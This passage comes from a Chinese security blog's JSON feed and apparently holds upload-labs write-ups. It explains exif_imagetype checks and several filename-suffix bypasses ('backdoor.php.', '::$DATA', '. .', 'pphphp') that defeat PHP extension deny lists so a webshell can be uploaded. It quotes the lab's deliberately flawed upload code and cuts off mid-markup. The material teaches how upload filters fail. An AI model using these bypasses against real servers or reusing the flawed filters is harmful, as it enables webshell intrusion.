函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。</p>\n<p>stripos(<em>string,find,start</em>)</p>\n<table>\n<thead>\n<tr>\n<th><em>string</em></th>\n<th>必需。规定被搜索的字符串。</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><em><strong>find</strong></em></td>\n<td><strong>必需。规定要查找的字符。</strong></td>\n</tr>\n<tr>\n<td><em>start</em></td>\n<td>可选。规定开始搜索的位置。</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"绕过exif_imagety\"><a class=\"markdownIt-Anchor\" href=\"#绕过exif_imagety\">#</a> 绕过 exif_imagety</h3>\n<p>exif_imagetype () 函数是 PHP 中的内置函数，用于确定图像的类型。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">int exif_imagetype( string $filename )</span><br></pre></td></tr></table></figure>\n<p>** 参数：** 该函数接受单个参数 $filename，该参数保存图像的名称或 URL。</p>\n<p>** 返回值：** 此函数返回与 IMAGETYPE 常量之一相对应的整数，如下所示：</p>\n<ul>\n<li>IMAGETYPE_GIF(1)</li>\n<li>IMAGETYPE_JPEG(2)</li>\n<li>IMAGETYPE_PNG(3)</li>\n<li>IMAGETYPE_SWF(4)</li>\n<li>IMAGETYPE_PSD(5)</li>\n<li>IMAGETYPE_BMP(6)</li>\n<li>IMAGETYPE_TIFF_II(7)</li>\n<li>IMAGETYPE_TIFF_MM(8)</li>\n<li>IMAGETYPE_JPC(9)</li>\n<li>IMAGETYPE_JP2(10)</li>\n<li>IMAGETYPE_JPX(11)</li>\n<li>IMAGETYPE_JB2(12)</li>\n<li>IMAGETYPE_SWC(13)</li>\n<li>IMAGETYPE_IFF(14)</li>\n<li>IMAGETYPE_WBMP(15)</li>\n<li>IMAGETYPE_XBM(16)</li>\n<li>IMAGETYPE_ICO(17)</li>\n<li>IMAGETYPE_WEBP(18)</li>\n</ul>\n<p>查看源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isImage</span>(<span class=\"params\"><span class=\"variable\">$filename</span></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//需要开启php_exif模块</span></span><br><span class=\"line\">    <span class=\"variable\">$image_type</span> = <span class=\"title function_ invoke__\">exif_imagetype</span>(<span class=\"variable\">$filename</span>);<span class=\"comment\">//关键，使用exif_imagetype内置函数，返回一个图片的类型</span></span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (<span class=\"variable\">$image_type</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> IMAGETYPE_GIF:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;gif&quot;</span>;</span><br><span class=\"line\">            <span class=\"comment\">//break;</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> IMAGETYPE_JPEG:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;jpg&quot;</span>;</span><br><span class=\"line\">            <span class=\"comment\">//break;</span></span><br><span class=\"line\">        <span class=\"keyword\">case</span> IMAGETYPE_PNG:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;png&quot;</span>;</span><br><span class=\"line\">            <span class=\"comment\">//break;    </span></span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            <span class=\"comment\">//break;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"variable\">$image_type</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$res</span> = <span class=\"title function_ invoke__\">isImage</span>(<span class=\"variable\">$temp_file</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"variable\">$res</span> == <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&quot;/&quot;</span>.<span class=\"title function_ invoke__\">rand</span>(<span class=\"number\">10</span>, <span class=\"number\">99</span>).<span class=\"title function_ invoke__\">date</span>(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$res</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>,<span class=\"variable\">$img_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中，如果要使用内置函数 exif_imagetype 的话，一定需要先开启 php_exif 模块</p>\n<p>开启方法如下：</p>\n<p>找到 <code>C:\\phpStudyB\\PHP\\php.ini</code>  文件</p>\n<p>服务器配置说明：</p>\n<p>1. 在 php.ini 文件中找到 <code>;extension=php_exif.dll</code> ，去掉前面的分号<br>\n 2. 在 php.ini 文件中找到 <code>;extension=php_mbstring.dll</code> ，去掉前面的分号，并将此行移动到 extension=php_exif.dll 之前，使之首先加载。</p>\n<ul>\n<li>去掉分号、移动到前面后：</li>\n</ul>\n<p><img src=\"image-20221004004519109.png\" alt=\"image-20221004004519109\"></p>\n<p>3. 找到 <code>[exif]</code>  段，把下面语句的分号去掉。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">;exif.encode_unicode = ISO-<span class=\"number\">8859</span>-<span class=\"number\">15</span></span><br><span class=\"line\">;exif.decode_unicode_motorola = UCS-<span class=\"number\">2</span>BE</span><br><span class=\"line\">;exif.decode_unicode_intel = UCS-<span class=\"number\">2</span>LE</span><br><span class=\"line\">;exif.encode_jis =</span><br><span class=\"line\">;exif.decode_jis_motorola = JIS</span><br><span class=\"line\">;exif.decode_jis_intel = JIS</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>去掉分号后：</p>\n</li>\n<li>\n<p><img src=\"image-20221004004610160.png\" alt=\"image-20221004004610160\"></p>\n</li>\n</ul>\n<p>开启后，如果还想再次验证是否开启 exif 模块的话，在 WWW 目录下放置 phpinfo.php</p>\n<p><img src=\"image-20221004004840389.png\" alt=\"image-20221004004840389\"></p>\n<p>然后直接访问 <code>http://www.upload_lab.com/phpinfo.php</code> , 并在页面 <code>Ctrl+F</code>  搜索 <code>exif</code>  即可。（<strong>不开启是搜索不到的</strong>）</p>\n<p><img src=\"image-20221004005007090.png\" alt=\"image-20221004005007090\"></p>\n",
            "tags": [
                "文件上传漏洞探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%90%8E%E7%BC%80%E5%8A%A0%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/",
            "url": "https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%90%8E%E7%BC%80%E5%8A%A0%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/",
            "title": "后缀加特殊字符绕过",
            "date_published": "2022-10-03T09:24:28.000Z",
            "content_html": "<h1 id=\"后缀加特殊字符绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀加特殊字符绕过\">#</a> 后缀加特殊字符绕过</h1>\n<p>本次讲解后缀加特殊字符绕过。</p>\n<h2 id=\"后缀加点绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀加点绕过\">#</a> 后缀加点绕过</h2>\n<p>常规看源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>发现并没对后缀名的最后一个。进行 deldot ()，因此存在后缀加点绕过漏洞。</p>\n<p>抓包，修改上传文件名，加个点：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.php.&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003172734314.png\" alt=\"image-20221003172734314\"></p>\n<p>菜刀连接对应文件即可。</p>\n<h2 id=\"后缀加data绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀加data绕过\">#</a> 后缀加::$DATA 绕过</h2>\n<p><img src=\"image-20221003173227712.png\" alt=\"image-20221003173227712\"><br>\n 抓包，修改文件名：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.php::<span class=\"subst\">$DATA</span>&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003174926600.png\" alt=\"image-20221003174926600\"></p>\n<p>在上传后由于文件流的特性::$DATA 会自动去除，而最终上传的是 php 文件</p>\n<p><img src=\"image-20221003175017386.png\" alt=\"image-20221003175017386\"></p>\n<h2 id=\"后缀加点空格点绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀加点空格点绕过\">#</a> 后缀加点 + 空格 + 点绕过</h2>\n<p>后缀 + <code>. .</code>  来进行绕过</p>\n<p>来看看源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;.php&quot;</span>,<span class=\"string\">&quot;.php5&quot;</span>,<span class=\"string\">&quot;.php4&quot;</span>,<span class=\"string\">&quot;.php3&quot;</span>,<span class=\"string\">&quot;.php2&quot;</span>,<span class=\"string\">&quot;.html&quot;</span>,<span class=\"string\">&quot;.htm&quot;</span>,<span class=\"string\">&quot;.phtml&quot;</span>,<span class=\"string\">&quot;.pht&quot;</span>,<span class=\"string\">&quot;.pHp&quot;</span>,<span class=\"string\">&quot;.pHp5&quot;</span>,<span class=\"string\">&quot;.pHp4&quot;</span>,<span class=\"string\">&quot;.pHp3&quot;</span>,<span class=\"string\">&quot;.pHp2&quot;</span>,<span class=\"string\">&quot;.Html&quot;</span>,<span class=\"string\">&quot;.Htm&quot;</span>,<span class=\"string\">&quot;.pHtml&quot;</span>,<span class=\"string\">&quot;.jsp&quot;</span>,<span class=\"string\">&quot;.jspa&quot;</span>,<span class=\"string\">&quot;.jspx&quot;</span>,<span class=\"string\">&quot;.jsw&quot;</span>,<span class=\"string\">&quot;.jsv&quot;</span>,<span class=\"string\">&quot;.jspf&quot;</span>,<span class=\"string\">&quot;.jtml&quot;</span>,<span class=\"string\">&quot;.jSp&quot;</span>,<span class=\"string\">&quot;.jSpx&quot;</span>,<span class=\"string\">&quot;.jSpa&quot;</span>,<span class=\"string\">&quot;.jSw&quot;</span>,<span class=\"string\">&quot;.jSv&quot;</span>,<span class=\"string\">&quot;.jSpf&quot;</span>,<span class=\"string\">&quot;.jHtml&quot;</span>,<span class=\"string\">&quot;.asp&quot;</span>,<span class=\"string\">&quot;.aspx&quot;</span>,<span class=\"string\">&quot;.asa&quot;</span>,<span class=\"string\">&quot;.asax&quot;</span>,<span class=\"string\">&quot;.ascx&quot;</span>,<span class=\"string\">&quot;.ashx&quot;</span>,<span class=\"string\">&quot;.asmx&quot;</span>,<span class=\"string\">&quot;.cer&quot;</span>,<span class=\"string\">&quot;.aSp&quot;</span>,<span class=\"string\">&quot;.aSpx&quot;</span>,<span class=\"string\">&quot;.aSa&quot;</span>,<span class=\"string\">&quot;.aSax&quot;</span>,<span class=\"string\">&quot;.aScx&quot;</span>,<span class=\"string\">&quot;.aShx&quot;</span>,<span class=\"string\">&quot;.aSmx&quot;</span>,<span class=\"string\">&quot;.cEr&quot;</span>,<span class=\"string\">&quot;.sWf&quot;</span>,<span class=\"string\">&quot;.swf&quot;</span>,<span class=\"string\">&quot;.htaccess&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">deldot</span>(<span class=\"variable\">$file_name</span>);<span class=\"comment\">//删除文件名末尾的点</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strrchr</span>(<span class=\"variable\">$file_name</span>, <span class=\"string\">&#x27;.&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">strtolower</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//转换为小写</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"string\">&#x27;::$DATA&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$file_ext</span>);<span class=\"comment\">//去除字符串::$DATA</span></span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$file_ext</span>); <span class=\"comment\">//首尾去空</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$file_ext</span>, <span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其中过滤了很多，但是如果当后缀名为 <code>. .</code>  时，文件名末尾的点只去除了一次，首尾去空以后还剩下一个点</p>\n<p>由于此时已经走完了代码的过滤流程，则可以实现上传 php 文件获得 webshell</p>\n<p>抓包，修改</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=&quot;backdoor.php. .&quot;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003175926184.png\" alt=\"image-20221003175926184\"></p>\n<p>即可上传成功。</p>\n<h2 id=\"后缀双写绕过\"><a class=\"markdownIt-Anchor\" href=\"#后缀双写绕过\">#</a> 后缀双写绕过</h2>\n<p>查看源码:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;php&quot;</span>,<span class=\"string\">&quot;php5&quot;</span>,<span class=\"string\">&quot;php4&quot;</span>,<span class=\"string\">&quot;php3&quot;</span>,<span class=\"string\">&quot;php2&quot;</span>,<span class=\"string\">&quot;html&quot;</span>,<span class=\"string\">&quot;htm&quot;</span>,<span class=\"string\">&quot;phtml&quot;</span>,<span class=\"string\">&quot;pht&quot;</span>,<span class=\"string\">&quot;jsp&quot;</span>,<span class=\"string\">&quot;jspa&quot;</span>,<span class=\"string\">&quot;jspx&quot;</span>,<span class=\"string\">&quot;jsw&quot;</span>,<span class=\"string\">&quot;jsv&quot;</span>,<span class=\"string\">&quot;jspf&quot;</span>,<span class=\"string\">&quot;jtml&quot;</span>,<span class=\"string\">&quot;asp&quot;</span>,<span class=\"string\">&quot;aspx&quot;</span>,<span class=\"string\">&quot;asa&quot;</span>,<span class=\"string\">&quot;asax&quot;</span>,<span class=\"string\">&quot;ascx&quot;</span>,<span class=\"string\">&quot;ashx&quot;</span>,<span class=\"string\">&quot;asmx&quot;</span>,<span class=\"string\">&quot;cer&quot;</span>,<span class=\"string\">&quot;swf&quot;</span>,<span class=\"string\">&quot;htaccess&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>]);</span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"variable\">$deny_ext</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$file_name</span>);</span><br><span class=\"line\">        <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$file_name</span>;        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">move_uploaded_file</span>(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>发现核心语句是：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$file_name</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"variable\">$deny_ext</span>,<span class=\"string\">&quot;&quot;</span>, <span class=\"variable\">$file_name</span>);</span><br></pre></td></tr></table></figure>\n<p>它是将<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><msub><mi>e</mi><mi>n</mi></msub><mi>a</mi><mi>m</mi><mi>e</mi><mtext>变量中获取到的文件上传名，从中遍历</mtext></mrow><annotation encoding=\"application/x-tex\">file_name变量中获取到的文件上传名，从中遍历</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">变</span><span class=\"mord cjk_fallback\">量</span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">获</span><span class=\"mord cjk_fallback\">取</span><span class=\"mord cjk_fallback\">到</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">上</span><span class=\"mord cjk_fallback\">传</span><span class=\"mord cjk_fallback\">名</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">从</span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">遍</span><span class=\"mord cjk_fallback\">历</span></span></span></span> deny_ext 数组的内容，如果发现有相同字符串，则替换成空</p>\n<p>如下测试：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.phphpp&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221003180734935.png\" alt=\"image-20221003180734935\"></p>\n<p>那么改变下双写位置就可以有：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">filename=<span class=\"string\">&quot;backdoor.pphphp&quot;</span></span><br></pre></td></tr></table></figure>\n<p><img 